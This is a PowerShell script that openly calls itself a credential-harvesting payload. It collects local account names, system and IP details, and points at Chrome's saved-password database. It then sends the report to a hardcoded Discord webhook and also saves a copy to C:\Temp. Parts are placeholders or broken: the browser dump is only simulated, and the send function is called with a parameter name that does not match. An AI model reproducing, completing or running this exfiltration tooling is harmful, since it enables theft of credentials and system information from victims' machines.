<#
.SYNOPSIS
    Focused Credential Harvesting Payload for direct Discord Webhook submission.
.DESCRIPTION
    This script aims to harvest critical password/credential data sets from the target machine
    and formats them into a highly structured JSON/Embed for Discord to maximize compliance and readability.
.NOTES
    Author: DIG-TWO
    Focus: Credential Theft (No persistence needed)
#>

# =========================================================
# --- 1. CONFIGURATION SECTION (EDIT THESE VALUES) ---
# =========================================================

# Your provided Discord Webhook URL
$WebhookURL = "https://discord.com/api/webhooks/1511832980744835074/UVIFIzLHMBWkw2f2llrb5UQI43RQ4LpkmdAyBYxH2fiB91N0Jm07QxA_6oD1aTol7Be9"

# --- BROWSER/CREDENTIAL PLUGINS (YOU MUST EXPAND THIS) ---
# Since we aren't implementing full SQLite parsing, we simulate where to look.
# Add specific functions here later (e.g., Get-ChromePass, Get-EdgePass).

# =========================================================
# --- 2. CORE HARVESTING FUNCTIONS ---
# =========================================================

Function Get-LocalUserCredentials {
    Write-Host "[+] Harvesting Local User Credentials (net user)..." -ForegroundColor Cyan
    try {
        $Output = net user | Select-String -Pattern "User account name.*.*"

        $Creds = @()
        $Output | ForEach-Object {
            # Simple parsing: Extract username and assume it needs a password dump
            $Username = $_.ToString().Split(':')[0].Trim()
            $Creds += [PSCustomObject]@{
                Username = $Username;
                Status = "Local Account Check";
                Instructions = "Need manual dump/WMI query to get actual password hash."
            }
        }
        return $Creds
    } catch {
        return [PSCustomObject]@{Error = "Failed to check local users."}
    }
}

Function Get-SystemInfo {
    Write-Host "[+] Harvesting Core System Information..." -ForegroundColor Cyan
    try {
        $OSInfo = systeminfo | Select-String "OS Name" -UsedPattern $true;
        $Network = ipconfig /all | Select-String "IPv4 Address" -UsedPattern $true;

        return [PSCustomObject]@{
            OS = $OSInfo.ToString().Trim();
            NetworkIP = $Network.ToString().Trim()
        }
    } catch {
        return [PSCustomObject]@{OS = "Error"; NetworkIP = "Error"}
    }
}

Function Get-BrowserCredentialDump {
    Write-Host "[+] Attempting simulated Browser Credential Dump..." -ForegroundColor Cyan
    # Placeholder: In a real scenario, this function would execute the complex SQLite parsing.
    $DummyData = "Simulation: Look for stored credentials in the following paths: $env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    return [PSCustomObject]@{
        Simulation_Notes = $DummyData;
        Instructions = "Requires specialized module to parse SQLite DB."
    }
}

# =========================================================
# --- 3. WEBHOOK TRANSMISSION LOGIC ---
# =========================================================

Function Send-WebhookReport {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Payload
    )
    # Simplest possible message structure
    $Body = @{
        content = "TEST MESSAGE SENT BY SCRIPT";
        embeds = @{
            title = "Test";
            description = "Testing connectivity.";
            color = 65280
        }
    } | ConvertTo-Json

    try {
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Body -ContentType "application/json" -ErrorAction Stop
        Write-Host "[SUCCESS] Test message sent." -ForegroundColor Green
    } catch {
        Write-Error "Test failed! $($_.Exception.Message)"
    }
}

# =========================================================
# --- 4. MASTER EXECUTION FLOW ---
# =========================================================

Write-Host "==========================================================================" -ForegroundColor White
Write-Host "=== STARTER: RUNNING CREDENTIAL HARVESTER PAYLOAD =======================" -ForegroundColor White
Write-Host "==========================================================================" -ForegroundColor White

# 1. Collect All Data Points
$UserCreds = Get-LocalUserCredentials
$SysInfo = Get-SystemInfo
$BrowserData = Get-BrowserCredentialDump

# 2. Aggregate All Data into ONE Object (The single data packet)
$FinalReport = [PSCustomObject]@{
    SystemInfo = $SysInfo;
    NetworkIP = $SysInfo.NetworkIP;
    LocalCreds = $UserCreds;
    BrowserVault = $BrowserData
}

# 3. Transmit
Send-WebhookReport -AllData $FinalReport

# 4. Local Fallback (For local monitoring if network fails)
Write-Host ""
Write-Host "==========================================================================" -ForegroundColor Yellow
Write-Host "======== LOCAL OFFLINE REPORT DUMP ========" -ForegroundColor Yellow
Write-Host "==========================================================================" -ForegroundColor Yellow
# Dump everything locally to a file named after the system/date for quick retrieval
$OutputFile = "C:\Temp\CredentialHarvest_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
$FinalReport | Out-File -FilePath $OutputFile -Encoding UTF8

Write-Host "[+] OFFLINE: Full detailed report saved to: $OutputFile" -ForegroundColor Yellow

Write-Host ""
Write-Host "==========================================================================" -ForegroundColor White
Write-Host "==================== PAYLOAD EXECUTION COMPLETE =====================" -ForegroundColor White
